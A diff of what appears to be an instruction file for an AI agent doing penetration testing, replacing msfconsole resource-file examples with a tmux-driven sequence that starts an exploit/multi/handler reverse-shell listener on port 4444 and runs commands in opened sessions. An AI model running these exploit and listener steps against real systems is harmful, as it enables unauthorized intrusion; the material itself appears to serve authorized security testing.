@@ -63,27 +63,19 @@ BLOCKED patterns:
 - python3 / irb / node REPL
 - Any command that shows a "> " or "$ " prompt and waits for keystrokes
 
-CORRECT patterns for msfconsole:
-  # Option A: Resource file + run_in_background + poll output
-  cat > /tmp/msf.rc << 'RCEOF'
-  use exploit/...
-  set RHOSTS target
-  set LHOST attacker_ip
-  set LPORT 4444
-  run -z
-  sleep 10
-  sessions -i 1 -C "id; whoami; uname -a"
-  exit -y
-  RCEOF
+CORRECT pattern — use TmuxSession for ALL interactive processes:
+  TmuxSession({ action: "new", session: "msf", command: "msfconsole -q" })
+  TmuxSession({ action: "wait_for", session: "msf", pattern: "msf6 >", timeout: 60000 })
+  TmuxSession({ action: "send", session: "msf", text: "use exploit/multi/handler" })
+  TmuxSession({ action: "wait_for", session: "msf", pattern: "msf6.*>" })
+  TmuxSession({ action: "send", session: "msf", text: "set LHOST 0.0.0.0" })
+  TmuxSession({ action: "send", session: "msf", text: "set LPORT 4444" })
+  TmuxSession({ action: "send", session: "msf", text: "run -j" })
+  TmuxSession({ action: "wait_for", session: "msf", pattern: "session \\d+ opened", timeout: 120000 })
+
+  Fallback (one-shot, no interaction needed): resource file + run_in_background
   Bash({ command: "msfconsole -q -r /tmp/msf.rc > /tmp/msf_out.txt 2>&1", run_in_background: true })
-  # Then poll: Bash({ command: "tail -30 /tmp/msf_out.txt" })
-
-  # Option B: -x with explicit exit
-  msfconsole -q -x "use exploit/...; set RHOSTS t; set LHOST a; set LPORT p; run -z; sleep 10; sessions -i 1 -C 'id'; exit -y" > /tmp/msf_out.txt 2>&1
-
-KEY: "run -z" backgrounds the session (no interactive meterpreter drop-in).
-     "exit -y" ensures msfconsole exits even if sessions are open.
-     Always redirect to a file and poll with tail.
+  KEY: "run -z" backgrounds session, "exit -y" forces exit.
 
 ## Other Instructions
 - Always quote paths with spaces: "path with spaces/file.txt"
